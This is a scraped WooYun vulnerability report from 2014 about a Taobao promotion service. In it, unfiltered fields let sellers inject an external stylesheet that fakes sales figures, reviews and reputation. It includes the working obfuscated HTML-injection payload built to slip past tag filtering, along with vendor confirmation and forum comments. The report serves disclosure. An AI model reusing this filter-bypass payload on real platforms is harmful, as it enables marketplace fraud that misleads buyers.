{"id": 2154, "wybug_id": "wooyun-2014-066678", "wybug_title": "淘宝某服务过滤不严可导致恶意修改销量、删除评价等操作", "wybug_corp": "淘宝网", "wybug_author": "Jackiis", "wybug_date": "2014-06-30 10:59", "wybug_open_date": "2014-08-14 11:00", "wybug_type": "内容安全", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["淘宝", "改销量"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-14：\t细节向公众公开  简要描述： 淘宝某服务过滤不严可导致载入自定义CSS，可恶意修改销量、删除评价、修改信誉，只有你想不到，没有你做不到！ 详细说明：  首先展示下一个淘宝商家使用此方法进行作弊的链接：http://item.taobao.com/item.htm?spm=a230r.1.14.24.MGOHvR&id=391369**点进去仔细看下就知道他在作弊了。\n\n我们右键查看下他的源代码，发现当中有个pj.css的样式文件\n\n追踪下发现居然是外部的一个css样式，地址如下：http://tbodn.com/pj.css这个现象已经很明显了，那我们再来追踪下这个CSS文件是从哪里载入的！打开调试页面 我们搜索下pj.css这个文件，\n\n搜索发现，此CSS确实是从某个地方插入进来，而且html代码极不规范。\n<link href=\"http://tbodn.com/pj.css\" rel=\"stylesheet\" div=\"\" <=\"\">\n存在错误，但是浏览器有纠正功能，导致css被成功加载！OK，有CSS之后，那html销量、代码这块应该就很容易了，下面来找下他的代码这块。\n\n修改销量和评价的代码存放在页面左边的侧边栏当中，代码太长，就不复制了，主要还是有css，其他就是小儿科了。下面来讲下如何插入这个恶意的外部CSS把。==========================万恶的分割线==========================首先，去淘宝服务市场订购“满就送”这项服务服务地址：http://fuwu.taobao.com/ser/detail.htm?spm=a1z13.1113643.1113643.37.LxWCue&service_code=TADGET_SHOP_TACTIC&tracelog=search&scm=&ppath=&labels=订购好之后我们会进入这个页面\n\n上图中标明1、2.说明恶意的构造代码是从这部分插入的，下面就不展示我如何去做的了，讲讲测试的过程太心酸了，直接附上成果。活动名称：\n&lt;!--\n优惠备注：\n-->&lt;lilinknk hrhrefef=\"//tbodn.com/pj.css\" rrelel=&quot;ststyleylesheet&quot; div\n\n\n其他部分随便填写就行了，点击完成设置，然后我们去宝贝页面看看\n\n已经插入成功！那么我们现在就插入改销量的代码，来看看这个危害吧。\n\n随意修改销量，评价当然也不能漏！\n\n这还不够猛的，来点有意思的把。\n\n这货应该是每个开淘宝的都梦寐以求的，想要几个都行，哈哈，当然你会发现有个地方错位了，没问题，调整下css即可覆盖上方的销量，小儿科的我就不演示了，主要是给大家展示下原理而已。写了那么多，还真累啊，不知道淘宝有木有礼物，要知道俺也是放弃了赚大钱的人，哈哈。。。   漏洞证明：  \n\n上图是俺测试的结果，那么下面就曝光一个商家利用这个漏洞的，哈哈，千万别和商家说是我说的。。。http://item.taobao.com/item.htm?spm=a230r.1.14.24.MGOHvR&id=391369***   修复方案：  简单的方法就是服务端直接过滤掉 < > &lt; 其实我想说的是淘宝已经修补这个服务的漏洞好多次了，但是每次都治标不治本，包括过滤html标签中的 style 、 link 等，我上面给出的代码已经说明了这个问题，解决起来应该不难。最后再说句，小菜第一次发布漏洞，淘宝千万不能啃爹，礼物一定送起，哈哈，那样以后才会有动力提交漏洞。。。。   版权声明：转载请注明来源 Jackiis@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-06-30 15:00 厂商回复： 感谢您的关注和支持，该漏洞我们正在修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-10 16:56 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  洞主，还有这样的漏洞请先联系我    \n     2014-07-21 10:52 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  屌爆    \n     2014-08-14 11:12 |    \t\t半夏 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 新人一枚。。)\t\t \n  NB 不过手机端就没用了吧    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}